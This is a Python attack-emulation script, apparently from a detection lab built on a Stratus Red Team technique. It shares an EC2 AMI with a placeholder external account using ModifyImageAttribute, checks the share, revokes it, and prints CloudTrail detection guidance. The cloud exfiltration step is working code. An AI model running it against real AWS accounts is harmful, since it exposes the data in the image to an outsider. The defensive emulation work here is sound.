"""
Technique : aws.exfiltration.ec2-share-ami
Tactic    : Exfiltration (T1537)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ami/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the AMI copy.
  - Note: AMI copying can take several minutes to complete.

How the attack works:
  An attacker with ec2:ModifyImageAttribute modifies an AMI's launch permission
  to share it with an external AWS account. The attacker can then launch instances
  from the AMI in their own account, gaining access to any data baked into the image.

Detection signal:
  - ec2:ModifyImageAttribute adding launchPermission for an external account ID.

Revert:
  - Automated: ModifyImageAttribute with Remove to revoke launch permission.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

# Simulated attacker-controlled AWS account ID
ATTACKER_ACCOUNT_ID = "012345678901"
DWELL_TIME_S        = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir, capture_output=True, text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir = str(Path(__file__).parent.parent / "infra")
    infra     = get_pulumi_outputs(stack_dir)
    ami_id    = infra.get("ami_id", "")

    if not ami_id:
        print("[!] ami_id not found. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    ec2_client = session.client("ec2")

    try:
        # ── Step 1: Share AMI with attacker account ───────────────────────────
        banner("Step 1 — Share AMI with external account (ModifyImageAttribute)")
        ec2_client.modify_image_attribute(
            ImageId=ami_id,
            Attribute="launchPermission",
            LaunchPermission={"Add": [{"UserId": ATTACKER_ACCOUNT_ID}]},
        )
        print(f"  [+] AMI {ami_id} shared with account: {ATTACKER_ACCOUNT_ID}")
        print(f"  [!] CloudTrail event: ec2:ModifyImageAttribute (launchPermission Add)")
        print(f"  [!] Attacker can now launch instances from this AMI in their account.")

        # ── Step 2: Verify the share ──────────────────────────────────────────
        banner("Step 2 — Verify launch permission was added")
        attrs = ec2_client.describe_image_attribute(
            ImageId=ami_id,
            Attribute="launchPermission",
        )
        perms = attrs.get("LaunchPermissions", [])
        account_ids = [p.get("UserId", "") for p in perms]
        print(f"  [+] Launch permissions now include: {account_ids}")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert: Remove launch permission ──────────────────────────────────
        banner("Revert — Remove launch permission (ModifyImageAttribute)")
        if ami_id:
            try:
                ec2_client.modify_image_attribute(
                    ImageId=ami_id,
                    Attribute="launchPermission",
                    LaunchPermission={"Remove": [{"UserId": ATTACKER_ACCOUNT_ID}]},
                )
                print(f"  [+] Launch permission revoked for account: {ATTACKER_ACCOUNT_ID}")
                print(f"  [!] CloudTrail event: ec2:ModifyImageAttribute (launchPermission Remove)")
            except ClientError as exc:
                print(f"  [!] ModifyImageAttribute (remove) failed: {exc}")

    banner("Complete")
    print("CloudTrail events: ec2:ModifyImageAttribute x2, ec2:DescribeImageAttribute")
    print("\nDetection guidance:")
    print("  Alert on ec2:ModifyImageAttribute adding launchPermission for any external")
    print("  account ID. AMI sharing is rarely needed in normal operations.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the AMI copy.")


if __name__ == "__main__":
    main()
